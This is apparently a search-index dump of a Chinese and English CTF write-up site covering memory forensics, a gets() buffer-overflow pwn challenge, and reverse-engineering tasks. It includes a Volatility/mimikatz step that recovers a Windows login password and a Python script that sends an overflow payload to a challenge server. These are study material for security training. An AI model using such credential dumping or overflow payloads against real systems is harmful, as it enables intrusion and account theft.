\uff0c\u518d\u770b\u770b\u8fd8\u6709\u6ca1\u6709\u538b\u7f29\u5305\u5427\uff01\u679c\u7136\u6709\uff01\\(\u03a6\u03c9\u03a6)/ 1 2 3 4 5 6 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep zip Volatility Foundation Volatility Framework 2 .6 0x000000003e444a60 15 0 R--r-d \\D evice \\H arddiskVolume2 \\W indows \\S ystem32 \\z ipfldr.dll 0x000000003ee522e0 16 0 R--r-d \\D evice \\H arddiskVolume2 \\P rogram Files \\V Mware \\V Mware Tools \\z ip.exe 0x000000003f2f49e0 15 0 R--r-- \\D evice \\H arddiskVolume2 \\P rogram Files \\V Mware \\V Mware Tools \\z ip.exe 0x000000003f3356f0 1 0 R--rw- \\D evice \\H arddiskVolume2 \\P ROGRA~1 \\M SBuild \\M ICROS~1 \\W INDOW~1 \\k ey.zip \u4f7f\u7528 \u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3 \u89e3\u538b\uff0c\u7531\u4e8e Linux \u548c Windows \u7684\u7f16\u7801\u4e0d\u540c\uff0c\u9700\u8981\u7279\u522b\u6ce8\u610f\u4f7f\u7528\u4e2d\u6587\u52a0\u5bc6\u7684\u538b\u7f29\u5305 1 2 3 $ unzip -P \" $( echo -n \u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3 | iconv -f utf-8 -t gbk ) \" key.zip Archive: key.zip inflating: exp \u7ec8\u4e8e\u548c Who_am_I.zip \u6709\u5173\u7cfb\u4e86\uff01\u4f46\u662f\u8fd8\u8981\u5148\u89e3\u5bc6 TAT exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from PIL import Image import struct pic = Image . open ( 'key.bmp' ) fp = open ( 'flag' , 'rb' ) fs = open ( 'Who_am_I' , 'wb' ) a , b = pic . size list1 = [] for y in range ( b ): for x in range ( a ): pixel = pic . getpixel (( x , y )) list1 . extend ([ pixel [ 1 ], pixel [ 0 ], pixel [ 2 ], pixel [ 2 ], pixel [ 1 ], pixel [ 0 ]]) data = fp . read () for i in range ( 0 , len ( data )): fs . write ( struct . pack ( 'B' , data [ i ] ^ list1 [ i % a * b * 6 ])) fp . close () fs . close () \u53ea\u80fd\u770b\u770b\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u4e86\uff0c YusaYusa520 \u89e3\u5bc6 Who_am_I.zip 1 2 3 4 5 $ python vol.py mimikatz -f ../Yusa\u7684\u79d8\u5bc6/Yusa-PC.raw --profile = Win7SP1x64 Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Yusa YUSA-PC YusaYusa520 wdigest YUSA-PC$ WORKGROUP \u7a0d\u5fae\u6539\u6539 exp \u5c31\u53ef\u4ee5\u89e3\u51fa flag \uff0c\u662f GIF \u5176\u4e2d\u4e00\u5e27\u6709 Flag\uff0c\u63d0\u53d6\u51fa\u6765\u5373\u53ef~","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/yusa_secret/#_3","text":"Volatility Usage \u00b7 volatilityfoundation/volatility Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"pwn/amnesia/","text":"\u9898\u76ee \u00b6 \u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world! \uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u5668\u7248\u672c\uff1aDocker \u955c\u50cf ustclug/debian:10 \u4e2d apt update && apt -y upgrade && apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 \u7684\u7248\u672c \u8f7b\u5ea6\u5931\u5fc6 \u00b6 \u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u8f7b\u5ea6\u5931\u5fc6 \u00b6 .data \u6bb5\u5b58\u50a8\u5168\u90e8\u7684\u5168\u5c40\u53d8\u91cf\u548c\u6240\u6709\u88ab static \u4fee\u9970\u7684\u53d8\u91cf\uff0c .rodata \u6bb5\u5b58\u50a8\u672a\u88ab\u4f5c\u4e3a\u521d\u59cb\u5316\u4f7f\u7528\u7684 \u5b57\u7b26\u4e32\u5e38\u91cf \u548c\u88ab const \u4fee\u9970\u7684\u5168\u5c40\u53d8\u91cf \u5f53\u5b57\u7b26\u4e32\u5e38\u91cf\u88ab\u7528\u6765\u4e3a\u6570\u7ec4\u521d\u59cb\u5316\u65f6\uff0c\u8be5\u5b57\u7b26\u4e32\u5e38\u91cf\u5c06\u653e\u5165\u5bf9\u5e94\u6570\u7ec4\u4e2d\uff08\u5c40\u90e8\u53d8\u91cf\u5728\u6808\u533a\uff09 \u7531\u4e8e\u4f7f\u7528 printf \u4ecd\u7136\u4f1a\u5305\u542b\u5b57\u7b26\u4e32\u5e38\u91cf\uff0c\u4f7f\u7528 puts \u76f4\u63a5\u8f93\u51fa 1 2 3 4 5 6 #include <stdio.h> int main (){ char str [ 14 ] = \"Hello, world!\" ; puts ( str ); } \u53c2\u8003\u8d44\u6599 \u00b6 \u6d45\u8c08C\u8bed\u8a00\u7684\u6570\u636e\u5b58\u50a8\uff08\u4e00\uff09","title":"Amnesia"},{"location":"pwn/amnesia/#_1","text":"\u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world! \uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u5668\u7248\u672c\uff1aDocker \u955c\u50cf ustclug/debian:10 \u4e2d apt update && apt -y upgrade && apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 \u7684\u7248\u672c","title":"\u9898\u76ee"},{"location":"pwn/amnesia/#_2","text":"\u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002","title":"\u8f7b\u5ea6\u5931\u5fc6"},{"location":"pwn/amnesia/#_3","text":"","title":"\u89e3\u9898\u601d\u8def"},{"location":"pwn/amnesia/#_4","text":".data \u6bb5\u5b58\u50a8\u5168\u90e8\u7684\u5168\u5c40\u53d8\u91cf\u548c\u6240\u6709\u88ab static \u4fee\u9970\u7684\u53d8\u91cf\uff0c .rodata \u6bb5\u5b58\u50a8\u672a\u88ab\u4f5c\u4e3a\u521d\u59cb\u5316\u4f7f\u7528\u7684 \u5b57\u7b26\u4e32\u5e38\u91cf \u548c\u88ab const \u4fee\u9970\u7684\u5168\u5c40\u53d8\u91cf \u5f53\u5b57\u7b26\u4e32\u5e38\u91cf\u88ab\u7528\u6765\u4e3a\u6570\u7ec4\u521d\u59cb\u5316\u65f6\uff0c\u8be5\u5b57\u7b26\u4e32\u5e38\u91cf\u5c06\u653e\u5165\u5bf9\u5e94\u6570\u7ec4\u4e2d\uff08\u5c40\u90e8\u53d8\u91cf\u5728\u6808\u533a\uff09 \u7531\u4e8e\u4f7f\u7528 printf \u4ecd\u7136\u4f1a\u5305\u542b\u5b57\u7b26\u4e32\u5e38\u91cf\uff0c\u4f7f\u7528 puts \u76f4\u63a5\u8f93\u51fa 1 2 3 4 5 6 #include <stdio.h> int main (){ char str [ 14 ] = \"Hello, world!\" ; puts ( str ); }","title":"\u8f7b\u5ea6\u5931\u5fc6"},{"location":"pwn/amnesia/#_5","text":"\u6d45\u8c08C\u8bed\u8a00\u7684\u6570\u636e\u5b58\u50a8\uff08\u4e00\uff09","title":"\u53c2\u8003\u8d44\u6599"},{"location":"pwn/when_did_you_born/","text":"\u89e3\u9898\u601d\u8def \u00b6 file \u67e5\u770b\u9644\u4ef6\uff0c\u662f 64 \u4f4d\u7684 ELF 1 2 $ file 24ac28ef281b4b6caab44d6d52b17491 24ac28ef281b4b6caab44d6d52b17491: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/l, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped \u4f7f\u7528 64 \u4f4d\u7684 IDA Pro \u6253\u5f00\uff0c\u627e\u5230 main \u8f6c\u5230\u4f2a\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { __int64 result ; // rax // \u5f53\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u65f6\uff0c\u8d4b\u7ed9\u53d8\u91cf v4 \u7684\u503c\u5c06\u8986\u76d6\u53d8\u91cf v5 char v4 ; // [rsp+0h] [rbp-20h] unsigned int v5 ; // [rsp+8h] [rbp-18h] // 20h - 18h = 8h // \u53d8\u91cf v4 \u4e0e\u53d8\u91cf v5 \u7684\u6808\u7a7a\u95f4\u76f8\u5dee 8 \u4e2a\u5b57\u8282 unsigned __int64 v6 ; // [rsp+18h] [rbp-8h] v6 = __readfsqword ( 0x28u ); setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); setbuf ( stderr , 0L L ); puts ( \"What's Your Birth?\" ); __isoc99_scanf ( \"%d\" , & v5 ); while ( getchar () != 10 ) ; if ( v5 == 1926 ) // \u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u8f93\u5165\u4f7f v5 \u7684\u503c\u4e3a 1926 { puts ( \"You Cannot Born In 1926!\" ); result = 0L L ; } else { puts ( \"What's Your Name?\" ); gets ( & v4 ); // gets \u4e0d\u68c0\u67e5\u8f93\u5165\u957f\u5ea6 printf ( \"You Are Born In %d \\n \" , v5 ); // \u76ee\u6807\uff1a\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u4f7f v5 \u7684\u503c\u4e3a 1926 if ( v5 == 1926 ) { puts ( \"You Shall Have Flag.\" ); system ( \"cat flag\" ); } else { puts ( \"You Are Naive.\" ); puts ( \"You Speed One Second Here.\" ); } result = 0L L ; } return result ; } \u53d8\u91cf v4 \u4e0e\u53d8\u91cf v5 \u7684\u6808\u7a7a\u95f4\u76f8\u5dee 8 \u4e2a\u5b57\u8282\uff0c\u5f53 What's Your Name? \u63d0\u793a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8d85\u8fc7 8 \u4f4d\u65f6\uff0c\u5c06\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \\(1926\\) \u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u662f 0x0786 \uff08\u5747\u4e3a\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff09\uff0c\u6ce8\u610f\u4f7f\u7528\u5c0f\u7aef\u5e8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import socket , time ip = '<server-ip>' port = < server - port > s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , port )) print ( s . recv ( 1024 ) . decode ()) s . send ( b '1 \\n ' ) # \u4efb\u610f\u8f93\u5165 time . sleep ( 0.5 ) print ( s . recv ( 1024 ) . decode ()) s . send ( b '11111111 \\x86\\x07\\n ' ) time . sleep ( 0.5 ) print ( s . recv ( 1024 ) . decode ()) \u8fd0\u884c Python \u4ee3\u7801\uff0c\u6210\u529f\u83b7\u5f97 Flag 1 2 3 4 5 6 7 What 's Your Birth? What' s Your Name? You Are Born In 1926 You Shall Have Flag. cyberpeace { 82017cc00438da682e8bd4f335c26bee }","title":"when did you born"},{"location":"pwn/when_did_you_born/#_1","text":"file \u67e5\u770b\u9644\u4ef6\uff0c\u662f 64 \u4f4d\u7684 ELF 1 2 $ file 24ac28ef281b4b6caab44d6d52b17491 24ac28ef281b4b6caab44d6d52b17491: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/l, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped \u4f7f\u7528 64 \u4f4d\u7684 IDA Pro \u6253\u5f00\uff0c\u627e\u5230 main \u8f6c\u5230\u4f2a\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { __int64 result ; // rax // \u5f53\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u65f6\uff0c\u8d4b\u7ed9\u53d8\u91cf v4 \u7684\u503c\u5c06\u8986\u76d6\u53d8\u91cf v5 char v4 ; // [rsp+0h] [rbp-20h] unsigned int v5 ; // [rsp+8h] [rbp-18h] // 20h - 18h = 8h // \u53d8\u91cf v4 \u4e0e\u53d8\u91cf v5 \u7684\u6808\u7a7a\u95f4\u76f8\u5dee 8 \u4e2a\u5b57\u8282 unsigned __int64 v6 ; // [rsp+18h] [rbp-8h] v6 = __readfsqword ( 0x28u ); setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); setbuf ( stderr , 0L L ); puts ( \"What's Your Birth?\" ); __isoc99_scanf ( \"%d\" , & v5 ); while ( getchar () != 10 ) ; if ( v5 == 1926 ) // \u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u8f93\u5165\u4f7f v5 \u7684\u503c\u4e3a 1926 { puts ( \"You Cannot Born In 1926!\" ); result = 0L L ; } else { puts ( \"What's Your Name?\" ); gets ( & v4 ); // gets \u4e0d\u68c0\u67e5\u8f93\u5165\u957f\u5ea6 printf ( \"You Are Born In %d \\n \" , v5 ); // \u76ee\u6807\uff1a\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u4f7f v5 \u7684\u503c\u4e3a 1926 if ( v5 == 1926 ) { puts ( \"You Shall Have Flag.\" ); system ( \"cat flag\" ); } else { puts ( \"You Are Naive.\" ); puts ( \"You Speed One Second Here.\" ); } result = 0L L ; } return result ; } \u53d8\u91cf v4 \u4e0e\u53d8\u91cf v5 \u7684\u6808\u7a7a\u95f4\u76f8\u5dee 8 \u4e2a\u5b57\u8282\uff0c\u5f53 What's Your Name? \u63d0\u793a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8d85\u8fc7 8 \u4f4d\u65f6\uff0c\u5c06\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \\(1926\\) \u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u662f 0x0786 \uff08\u5747\u4e3a\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff09\uff0c\u6ce8\u610f\u4f7f\u7528\u5c0f\u7aef\u5e8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import socket , time ip = '<server-ip>' port = < server - port > s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , port )) print ( s . recv ( 1024 ) . decode ()) s . send ( b '1 \\n ' ) # \u4efb\u610f\u8f93\u5165 time . sleep ( 0.5 ) print ( s . recv ( 1024 ) . decode ()) s . send ( b '11111111 \\x86\\x07\\n ' ) time . sleep ( 0.5 ) print ( s . recv ( 1024 ) . decode ()) \u8fd0\u884c Python \u4ee3\u7801\uff0c\u6210\u529f\u83b7\u5f97 Flag 1 2 3 4 5 6 7 What 's Your Birth? What' s Your Name? You Are Born In 1926 You Shall Have Flag. cyberpeace { 82017cc00438da682e8bd4f335c26bee }","title":"\u89e3\u9898\u601d\u8def"},{"location":"reverse/easyre/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u4e4b\u524d\u6ca1\u600e\u4e48\u505a\u8fc7\u9006\u5411\u7684\u9898\u543c~\u6240\u4ee5\u5f53\u62ff\u5230\u9898\u76ee\u7684 EXE \u6587\u4ef6\u65f6\u2026\u2026\u5f53\u7136\u662f\u4e0d\u77e5\u6240\u63aa\u554a(o_ _)\uff89 \u4e0d\u77e5\u9053\u662f\u505a\u5565\u7684 EXE \u6587\u4ef6\u5f53\u7136\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c~(<\u309d\u03c9\u03a6)\u8fd9\u91cc\u8981\u7528\u5230 IDA Pro \u8fd9\u4e2a\uff08\u529f\u80fd\u4e30\u5bcc\u7684\u8de8\u5e73\u53f0\u591a\u5904\u7406\u5668\u53cd\u6c47\u7f16\u7a0b\u5e8f\u548c\u8c03\u8bd5\u5668\uff09\u5de5\u5177 Shift + F12 \u6253\u5f00 Strings \u7a97\u53e3\uff0c\u770b\u4e86\u770b\uff0c\u6ca1\u5565\u4e1c\u897f(\u2565\u03c9\u2565)\uff1a F5 \uff0c\u6e90\u4ee3\u7801\u770b\u4e0a\u53bb\u4e5f\u5e73\u5e73\u65e0\u5947\uff1a \u524d\u9762\u53ea\u662f\u719f\u6089\u4e00\u4e0b\u529f\u80fd(<\u309d\u03c9\u03a6)\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u8fdb\u5165\u52a8\u6001\u8c03\u8bd5\uff08\u73af\u5883\uff1aWindows 10\uff09 IDA Pro \u52a8\u6001\u8c03\u8bd5 \u00b6 \u6ce8\u610f\uff1a\u9700\u8981\u8c03\u8bd5\u7684 EXE \u6587\u4ef6\u6240\u5728\u8def\u5f84\u4e0d\u80fd\u5305\u542b\u4e2d\u6587\uff01 \u5728\u8c03\u8bd5\u4e4b\u524d\uff0c\u5148\u542f\u52a8\u4f4d\u4e8e IDA \u6587\u4ef6\u5939 dbgsrv \u76ee\u5f55\u4e0b\u7684 win32_remote.exe \uff0c\u8c03\u8bd5\u5668\u9009\u62e9 Remote Windows debugger \uff0c\u5f00\u59cb\u8c03\u8bd5\u524d\u5148\u4e0b\u65ad\u70b9\uff08 Hostname \u586b 127.0.0.1 \uff09 \u5355\u6b65\u8c03\u4e86\u4e00\u5708\u6ca1\u53d1\u73b0\u5565\uff0c\u8d85\u7ea7\u5931\u843d\u3010\u6342\u8138\u3011 Ctrl + F12 \u8c03\u51fa\u51fd\u6570\u8c03\u7528\u5173\u7cfb\u56fe\uff0c\u53d1\u73b0\u53ef\u7591\u51fd\u6570\uff01 \u4e0d\u4ec5\u6ca1\u88ab\u8c03\u7528\uff0c\u8fd8\u8c03\u7528\u4e86 _putchar \u51fd\u6570 - \u52a8\u6001\u8c03\u8bd5\u65f6\u5c06 EIP \u4fee\u6539\u81f3 _ques \u7684\u5f00\u59cb\u5730\u5740 0x00401520 \uff0c\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef\u770b\u5230 flag","title":"EasyRe"},{"location":"reverse/easyre/#_1","text":"\u4e4b\u524d\u6ca1\u600e\u4e48\u505a\u8fc7\u9006\u5411\u7684\u9898\u543c~\u6240\u4ee5\u5f53\u62ff\u5230\u9898\u76ee\u7684 EXE \u6587\u4ef6\u65f6\u2026\u2026\u5f53\u7136\u662f\u4e0d\u77e5\u6240\u63aa\u554a(o_ _)\uff89 \u4e0d\u77e5\u9053\u662f\u505a\u5565\u7684 EXE \u6587\u4ef6\u5f53\u7136\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c~(<\u309d\u03c9\u03a6)\u8fd9\u91cc\u8981\u7528\u5230 IDA Pro \u8fd9\u4e2a\uff08\u529f\u80fd\u4e30\u5bcc\u7684\u8de8\u5e73\u53f0\u591a\u5904\u7406\u5668\u53cd\u6c47\u7f16\u7a0b\u5e8f\u548c\u8c03\u8bd5\u5668\uff09\u5de5\u5177 Shift + F12 \u6253\u5f00 Strings \u7a97\u53e3\uff0c\u770b\u4e86\u770b\uff0c\u6ca1\u5565\u4e1c\u897f(\u2565\u03c9\u2565)\uff1a F5 \uff0c\u6e90\u4ee3\u7801\u770b\u4e0a\u53bb\u4e5f\u5e73\u5e73\u65e0\u5947\uff1a \u524d\u9762\u53ea\u662f\u719f\u6089\u4e00\u4e0b\u529f\u80fd(<\u309d\u03c9\u03a6)\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u8fdb\u5165\u52a8\u6001\u8c03\u8bd5\uff08\u73af\u5883\uff1aWindows 10\uff09","title":"\u89e3\u9898\u601d\u8def"},{"location":"reverse/easyre/#ida-pro","text":"\u6ce8\u610f\uff1a\u9700\u8981\u8c03\u8bd5\u7684 EXE \u6587\u4ef6\u6240\u5728\u8def\u5f84\u4e0d\u80fd\u5305\u542b\u4e2d\u6587\uff01 \u5728\u8c03\u8bd5\u4e4b\u524d\uff0c\u5148\u542f\u52a8\u4f4d\u4e8e IDA \u6587\u4ef6\u5939 dbgsrv \u76ee\u5f55\u4e0b\u7684 win32_remote.exe \uff0c\u8c03\u8bd5\u5668\u9009\u62e9 Remote Windows debugger \uff0c\u5f00\u59cb\u8c03\u8bd5\u524d\u5148\u4e0b\u65ad\u70b9\uff08 Hostname \u586b 127.0.0.1 \uff09 \u5355\u6b65\u8c03\u4e86\u4e00\u5708\u6ca1\u53d1\u73b0\u5565\uff0c\u8d85\u7ea7\u5931\u843d\u3010\u6342\u8138\u3011 Ctrl + F12 \u8c03\u51fa\u51fd\u6570\u8c03\u7528\u5173\u7cfb\u56fe\uff0c\u53d1\u73b0\u53ef\u7591\u51fd\u6570\uff01 \u4e0d\u4ec5\u6ca1\u88ab\u8c03\u7528\uff0c\u8fd8\u8c03\u7528\u4e86 _putchar \u51fd\u6570 - \u52a8\u6001\u8c03\u8bd5\u65f6\u5c06 EIP \u4fee\u6539\u81f3 _ques \u7684\u5f00\u59cb\u5730\u5740 0x00401520 \uff0c\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef\u770b\u5230 flag","title":"IDA Pro \u52a8\u6001\u8c03\u8bd5"},{"location":"reverse/it_sova/","tags":["evm","bytecode"],"text":"#evm #bytecode .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 I wonder who should pay for the gas on the first date. https://sova.task.sasc.tf/ Solution \u00b6 The given website provides a backend code snippet and an input box. Sending any input will return the contract address: 0x5FbDB2315678afecb367f032d93F642f64180aa3 . To solve the challenge, we need to figure out the user_input that lets the function validate() execute successfully. We can use the RPC URL provided in the code snippet to get the EVM bytecode of the target contract, and then use Dedaub to decompile. 1 $ cast code --rpc-url https://sova-rpc.task.sasc.tf 0x5FbDB2315678afecb367f032d93F642f64180aa3 it_sova.code By briefly reviewing the decompiled code, basically, the function validate() accepts a string parameter and verifies its validity. It then performs corresponding computations based on the values stored in the contract storage and updates memory accordingly. Finally, it checks whether the result in MEM[0x1e0] is equal to 0x16c11e3b4fe39c85 (note that there are some discrepancies between the actual behavior and the decompiled code). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function validate ( string name_ ) public payable { require ( 4 + ( msg . data . length - 4 ) - 4 >= 32 ); require ( name_ <= uint64 . max ); require ( 4 + name_ + 31 < 4 + ( msg . data . length - 4 )); require ( name_ . length <= uint64 . max ); require ( name_ . data + name_ . length <= 4 + ( msg . data . length - 4 )); // [...] v6 = v7 = 0 ; while ( ! 1 ) { v8 = uint8 ( STORAGE [ v6 ]); v9 = STORAGE [ v6 ] >> 8 ; if ( v8 == 1 ) { MEM [ v1 + ( uint8 ( v9 ) << 5 )] = ( v9 >> 8 >> 8 << 196 >> 196 ) + MEM [ v1 + ( uint8 ( v9 >> 8 ) << 5 )]; // Unknown jump to Block 0x7abB0x42. Refer to 3-address code (TAC); } else if ( v8 == 2 ) { // [...] v6 = v6 + 1 ; } require ( 11 < 17 , Panic ( 50 )); // access an out-of-bounds or negative index of bytesN array or slice require ( 128 - name_ . length == 0x16c11e3b4fe39c85 ); // [...] } There are a total of 104 slots with values in the contract storage. Additionally, the computations and the locations of memory updates depend on the values read from these slots, making it difficult to directly understand the intent from the decompiled code. Another approach is to use Forge's debugger to observe how the function processes the user input and the pattern of memory updates. In short, the program first reverses the first 8 bytes of the input and splits them into two groups of 4 bytes each, assumed to be x and y , respectively. These two groups are then stored in four memory locations, assumed to be A , B , C , and D . Among them, A , B , and C hold the value x , while D holds the value y . Next, the program performs calculations using the values in these four memory locations in combination with masks. The final returned value is based on values stored in C and D . For details, refer to the following code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input = b \"ABCDEFGH\" x , y = int ( input [:: - 1 ][ 4 :] . hex (), 16 ), int ( input [:: - 1 ][: 4 ] . hex (), 16 ) A , B , C , D = x , x , x , y masks = [ 0xf00dbabe , 0xdeadbeef , 0xbadc0ffe , 0xfeedface ] for i in range ( 4 ): A ^= masks [ i ] tmp = ( A << 5 ) | ( A >> 27 ) A = ( 0x045d9f3b * tmp ) & ( 2 ** 32 - 1 ) A = A ^ ( A >> 16 ) C = A ^ D D = B if i < 3 : A = B = C print ( \"result =\" , hex (( D << 32 ) | C )) Next, we can infer the input based on the desired result. According to the above code, let \\(X[i]\\) represent the result of each iteration. Given \\(C[i]\\) and \\(D[i]\\) , we can deduce that \\(A[i-1]=B[i-1]=D[i]\\) and \\(C[i-1]=B[i-1]\\) . Then, we can compute \\(A[i]\\) with \\(A[i-1]\\) , and by XORing it with \\(C[i]\\) , we can obtain \\(D[i-1]\\) . Repeat the above steps until the initial values of A (B / C) and D are obtained. 1 2 3 4 5 6 7 8 9 10 11 D , C = 0x16c11e3b , 0x4fe39c85 for i in range ( 3 , - 1 , - 1 ): A , B = D , D A ^= masks [ i ] tmp = ( A << 5 ) | ( A >> 27 ) A = ( 0x045d9f3b * tmp ) & ( 2 ** 32 - 1 ) A = A ^ ( A >> 16 ) D = C ^ A C = B print ( \"input =\" , int . to_bytes ( B , 4 , 'little' ) + int . to_bytes ( D , 4 , 'little' )) # input = b'Qy=*}OV(' Flag \u00b6 SAS{h00t_h00t_7h1s_6uy_w1ll_c0v3r_th3_c0st5_9f03fd}","title":"it Sova"},{"location":"reverse/it_sova/#description","text":"I wonder who should pay for the gas on the first date. https://sova.task.sasc.tf/","title":"Description"},{"location":"reverse/it_sova/#solution","text":"The given website provides a backend code snippet and an input box. Sending any input will return the contract address: 0x5FbDB2315678afecb367f032d93F642f64180aa3 . To solve the challenge, we need to figure out the user_input that lets the function validate() execute successfully. We can use the RPC URL provided in the code snippet to get the EVM bytecode of the target contract, and then use Dedaub to decompile. 1 $ cast code --rpc-url https://sova-rpc.task.sasc.tf 0x5FbDB2315678afecb367f032d93F642f64180aa3 it_sova.code By briefly reviewing the decompiled code, basically, the function validate() accepts a string parameter and verifies its validity. It then performs corresponding computations based on the values stored in the contract storage and updates memory accordingly. Finally, it checks whether the result in MEM[0x1e0] is equal to 0x16c11e3b4fe39c85 (note that there are some discrepancies between the actual behavior and the decompiled code). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function validate ( string name_ ) public payable { require ( 4 + ( msg . data . length - 4 ) - 4 >= 32 ); require ( name_ <= uint64 . max ); require ( 4 + name_ + 31 < 4 + ( msg . data . length - 4 )); require ( name_ . length <= uint64 . max ); require ( name_ . data + name_ . length <= 4 + ( msg . data . length - 4 )); // [...] v6 = v7 = 0 ; while ( ! 1 ) { v8 = uint8 ( STORAGE [ v6 ]); v9 = STORAGE [ v6 ] >> 8 ; if ( v8 == 1 ) { MEM [ v1 + ( uint8 ( v9 ) << 5 )] = ( v9 >> 8 >> 8 << 196 >> 196 ) + MEM [ v1 + ( uint8 ( v9 >> 8 ) << 5 )]; // Unknown jump to Block 0x7abB0x42. Refer to 3-address code (TAC); } else if ( v8 == 2 ) { // [...] v6 = v6 + 1 ; } require ( 11 < 17 , Panic ( 50 )); // access an out-of-bounds or negative index of bytesN array or slice require ( 128 - name_ . length == 0x16c11e3b4fe39c85 ); // [...] } There are a total of 104 slots with values in the contract storage. Additionally, the computations and the locations of memory updates depend on the values read from these slots, making it difficult to directly understand the intent from the decompiled code. Another approach is to use Forge's debugger to observe how the function processes the user input and the pattern of memory updates. In short, the program first reverses the first 8 bytes of the input and splits them into two groups of 4 bytes each, assumed to be x and y , respectively. These two groups are then stored in four memory locations, assumed to be A , B , C , and D . Among them, A , B , and C hold the value x , while D holds the value y . Next, the program performs calculations using the values in these four memory locations in combination with masks. The final returned value is based on values stored in C and D . For details, refer to the following code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input = b \"ABCDEFGH\" x , y = int ( input [:: - 1 ][ 4 :] . hex (), 16 ), int ( input [:: - 1 ][: 4 ] . hex (), 16 ) A , B , C , D = x , x , x , y masks = [ 0xf00dbabe , 0xdeadbeef , 0xbadc0ffe , 0xfeedface ] for i in range ( 4 ): A ^= masks [ i ] tmp = ( A << 5 ) | ( A >> 27 ) A = ( 0x045d9f3b * tmp ) & ( 2 ** 32 - 1 ) A = A ^ ( A >> 16 ) C = A ^ D D = B if i < 3 : A = B = C print ( \"result =\" , hex (( D << 32 ) | C )) Next, we can infer the input based on the desired result. According to the above code, let \\(X[i]\\) represent the result of each iteration. Given \\(C[i]\\) and \\(D[i]\\) , we can deduce that \\(A[i-1]=B[i-1]=D[i]\\) and \\(C[i-1]=B[i-1]\\) . Then, we can compute \\(A[i]\\) with \\(A[i-1]\\) , and by XORing it with \\(C[i]\\) , we can obtain \\(D[i-1]\\) . Repeat the above steps until the initial values of 